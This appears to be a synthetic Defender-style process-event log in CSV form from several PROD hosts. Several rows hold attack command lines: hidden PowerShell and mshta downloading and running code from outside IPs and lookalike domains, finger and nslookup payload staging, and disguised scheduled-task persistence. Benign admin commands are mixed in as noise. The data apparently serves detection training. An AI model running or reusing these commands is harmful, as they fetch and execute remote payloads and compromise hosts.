Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,ProcessCommandLine,ProcessId,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-02-02T22:59:46.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -ep bypass -w hidden -c ""irm https://45.141.87.30/rd3 | iex""",17179,explorer.exe,58762,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,c9dd9ec4d4defc8550fa8a59bdf9dcd2
2026-02-03T16:45:44.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,powershell.exe -WindowStyle Hidden -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwA3ADcALgA5ADEALgA2ADgALgAyADAALwByAGQANAApAA==,60019,explorer.exe,32752,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,dac183d0753d1a3d40ff1d43baccde4d
2026-02-04T17:52:57.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://179.43.167.55/rd5')""",39157,explorer.exe,42731,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,6e05a5f54c09d4cd9fa8de1873b81e31
2026-02-06T01:27:21.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -nop -w hidden -ep bypass -c ""IEX(irm https://212.193.30.21/rd6)""",30302,explorer.exe,38704,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,cb5f69bfacb06aca5a74be3e456c8dc8
2026-02-07T01:45:52.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NonInteractive -c ""iex(iwr -UseBasicParsing https://45.141.87.30/rd7)""",18212,explorer.exe,51621,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,9a125acc76feee612ac014ee3b9bf040
2026-02-08T01:56:02.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -ep bypass -c ""IEX(iwr https://77.91.68.20/rd8 -UseBasicParsing)""",33731,explorer.exe,30371,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,45f6884a40e00aa156a969cafec16cc8
2026-02-08T18:48:13.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""irm https://179.43.167.55/rd9 | iex""",8307,explorer.exe,30679,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,d1410d828dcf29be1c0f12a516b70dfa
2026-02-10T01:43:56.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -WindowStyle Hidden -c ""iex(iwr https://212.193.30.21/rd10)""",10739,explorer.exe,59787,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,3c5fd12d1b53268c2e02a5ce83102fe3
2026-02-10T20:52:03.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -nop -ep bypass -w hidden -c ""IEX(irm https://77.91.68.20/rd11)""",50022,explorer.exe,50792,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,32e11750bee613f1d3c62e6146830e44
2026-02-12T00:44:55.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://browser-verify2.store/rd12.hta,25209,explorer.exe,55782,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,e59698a5ffe181fbff3ad13bab2ad0bf
2026-02-13T00:01:46.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://cdn-flash-update2.live/rd13.hta,14520,explorer.exe,50695,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,712df91d955633f62aadefd6b0060cf3
2026-02-13T22:56:07.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,"mshta.exe ""javascript:d=new ActiveXObject('WScript.Shell');d.Run('powershell -w hidden -c iex(iwr https://45.141.87.30/rd14)',0)""",6083,explorer.exe,42513,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,c1501707b6deed368841aa27564ae054
2026-02-15T00:51:25.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://verify-cdn3.live/rd15.hta,26826,explorer.exe,58431,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,cb973cfa9eb42495f465b5fc7e0eabdd
2026-02-16T01:26:26.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://update-check2.shop/rd16.hta,40425,explorer.exe,9297,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,af0d86fbccd2973dd7060504fb31a6c9
2026-02-16T16:50:11.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,finger.exe svc@212.193.30.21,41499,explorer.exe,49384,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,dfff2445ce41096c143e9f1c0513a3a1
2026-02-17T22:04:29.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,finger.exe root@45.141.87.30,28720,explorer.exe,15203,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,0f64a784316df51adccd0a6cc74ee797
2026-02-18T22:49:39.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,ct.exe,C:\Windows\System32\ct.exe,b0aa83e7247b681aef421d9b961e0901a50aadf1,ct.exe 179.43.167.55,41966,explorer.exe,56428,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,786c601bbcd99d75c1815b9dd85bd5f4
2026-02-20T01:27:23.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup payload3.update-check.xyz 212.193.30.21,14970,cmd.exe,26270,cmd.exe,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,1af572d802ce71a5cd850b2a499e6426
2026-02-20T22:42:10.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup stage4.cdn-verify2.shop 45.141.87.30,37680,cmd.exe,10534,cmd.exe,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,bbfd24fcea4c6db9bd16fee87b1512f5
2026-02-21T19:48:25.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup c2-rd3.install-verify2.live 77.91.68.20,47845,cmd.exe,29607,cmd.exe,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,4a9d5860ae15680f5381de4a070a5091
2026-02-22T19:40:42.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""WinDefUpdate2"" /tr ""wscript.exe C:\Users\Public\wd2.vbs"" /sc minute /mo 19 /f",38699,powershell.exe,42753,powershell.exe,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,d7e4396e4958ec6f664f6dd13587dfc2
2026-02-23T20:42:39.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""ChromeHelper2"" /tr ""powershell.exe -w hidden -c iex(iwr https://77.91.68.20/c3)"" /sc minute /mo 19 /f",51308,powershell.exe,44055,powershell.exe,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,7bcb72c2f1ef667f132e7656168900bd
2026-02-01T22:57:58.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-VpnConnection""",25253,explorer.exe,20588,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,6f56722e08b65057542e5af3e7de3ca0
2026-02-01T18:29:32.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Add-VpnConnection -Name CorpVPN -ServerAddress vpn.prod.corp.local""",33521,explorer.exe,28243,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,2509196e847d4f58a5205bcda499ea8c
2026-02-01T19:10:37.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-NetAdapter | Where-Object Status -eq Up""",12064,explorer.exe,4192,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,bb8ee2f15e9066557a2b037066013fae
2026-02-01T18:52:44.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Invoke-GPUpdate -Force""",60916,explorer.exe,34237,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,9a33dfad7515fd5a5bac45c913623d6a
2026-02-01T18:10:53.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-MpThreatDetection""",26823,explorer.exe,18311,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,4de4f0e2c3c7374547941937e1a65a48
2026-02-01T20:48:19.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Start-MpScan -ScanType QuickScan""",54453,explorer.exe,25575,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,61884b627d8167f9a373a5677ffb820f
2026-02-02T01:36:33.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c netsh int ip reset,33065,explorer.exe,55264,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,e8c807c6eb6daf1372121a0a914e8e16
2026-02-01T17:47:08.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c netsh winsock reset,6292,explorer.exe,7230,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,8f3845c9cc0932114cc867452cce7ec1
2026-02-01T22:09:00.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c powercfg /batteryreport,12036,explorer.exe,37889,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,ace2dd2fc98718a25a75aed718c26423
2026-02-02T01:21:36.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c msconfig,37786,explorer.exe,17373,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,3bdfbeaa7d819047cdcc0de4e4646a40
2026-02-01T16:06:52.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-TimeZone""",32950,explorer.exe,54639,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,0fa948a826a59b3696df8ce0cbfae604
2026-02-01T17:29:51.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Set-TimeZone -Id 'Central European Standard Time'""",44679,explorer.exe,10925,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,69b73ebf3850d0710b6db8db51a32f39
2026-02-02T01:21:38.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-WinSystemLocale""",37275,explorer.exe,45362,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,b00ccc2d6d32059bbc213dcc02cbe299
2026-02-01T19:30:00.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Set-WinUserLanguageList de-DE -Force""",55047,explorer.exe,21639,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,aa076075b6b8fd7124f876e6395c25b6
2026-02-01T23:26:56.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c chkdsk C: /f /r,4620,explorer.exe,14070,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,5b76dfb7a1f95e24da30308398ef6ec1
2026-02-02T00:18:04.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c verifier /query,17265,explorer.exe,34857,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,f1a518d2e3d7b157f170eed5e4b9605c
2026-02-02T01:50:14.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-CimInstance Win32_LogicalDisk""",52258,explorer.exe,32685,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,3f687552b0bfec495a5e578c40af6a3e
2026-02-01T21:59:28.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-CimInstance Win32_NetworkAdapter""",36514,explorer.exe,31848,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,ee99638122f279768710bcc60215a728
2026-02-01T20:23:07.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""New-Item -ItemType Directory -Path C:\Logs\Archive""",27628,explorer.exe,44498,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,a661b6a211090eaefc8e164a94e268ca
2026-02-01T20:07:44.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Copy-Item C:\Logs\*.log C:\Logs\Archive\""",55261,explorer.exe,34223,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,fec8b3b94cc4097989005d336a0dbd64
2026-02-01T17:07:29.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c robocopy C:\Data \\PROD-FS01\Backup /E /LOG:C:\Logs\robocopy.log,48161,explorer.exe,13781,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,97662ea898c845a021b0064845f0719f
2026-02-02T00:23:02.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-SmbConnection""",35593,explorer.exe,19406,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,682c2fb77abc81d2f99b95971243874a
